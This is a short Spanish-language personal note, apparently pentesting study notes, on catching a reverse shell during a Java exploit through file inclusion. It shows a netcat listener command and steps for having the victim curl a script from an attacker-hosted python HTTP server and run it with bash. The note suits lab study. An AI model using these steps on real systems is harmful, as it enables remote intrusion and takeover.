ls nos permite recibir una rever shell
![[Pasted image 20230712022241.png]]
`nc -lnvp 4444`

- para enviar la revershell desde la maquina victima podemos usar este comando
 [[bash]]
 cuando estamos explotando un java4shell, debido a un localfileinclusion, debemos tener en cuenta que la revershell no debe de ir ejecutarse como comando en el payload, sino que es mejor, crear un archivo con el script y luego ya ejecutarlo con
 `bash archivo.sh` una buena forma seria hacindo un `curl ip_atacante` donde tengamos un server montado con python `sudo python3 -m http.server 80` y luego en el equipo victima haciendo uso del remote command execution `curl ip_atacante -o /tmp/reverse` asi datos del archivo se guardan,
 finalmente con remote command execution ejecutamos el archivo como dije anteriormente
 ![[Pasted image 20230712025801.png]]
 ![[Pasted image 20230712025813.png]]
 ![[Pasted image 20230712025835.png]]
 ![[Pasted image 20230712025924.png]]
 ![[Pasted image 20230712025901.png]]
 ya tenemos la bash
 ![[Pasted image 20230712030230.png]]
 